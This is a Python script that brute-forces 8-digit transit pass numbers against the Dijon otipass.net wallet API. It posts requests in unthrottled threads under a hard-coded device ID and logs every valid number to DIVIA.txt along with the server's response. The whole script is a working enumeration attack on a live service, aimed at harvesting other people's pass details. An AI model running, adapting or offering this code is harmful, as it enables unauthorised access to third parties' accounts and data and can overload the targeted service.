import requests as re
import threading
import time

def check(numero):
    resta=8-len(str(numero))
    print('0'*resta+''+str(numero))
    numitopass = '0'*resta+''+str(numero)
    dataa = {
        'numotipass': numitopass,
        'serialId':'android-dbd26ae82fe4126',
        'type':'numotipass'
    }
    response = re.post('https://www.otipass.net/api/dijon/v1/wallet',data=dataa)#, verify=False)
    print(response.text)
    if('code":"A5","message":"Numotipass' in response.text and 'introuvable' in response.text):
        print(response.text)
    elif(response.text ==''):
        check(numero)
    else:
        f = open('DIVIA.txt', 'a+')
        f.write('0'*resta+''+str(numero) + ' - ' + response.text + ' \n')
        print(response.text)

numitopass = '00000000'
threads=threading.active_count()+int(input('Enter Threads: '))
for numero in range(12434911,99999999):
    while True:
        if(int(threading.active_count()) < threads):
            threading.Thread(target=check, args=(numero,)).start()
            break



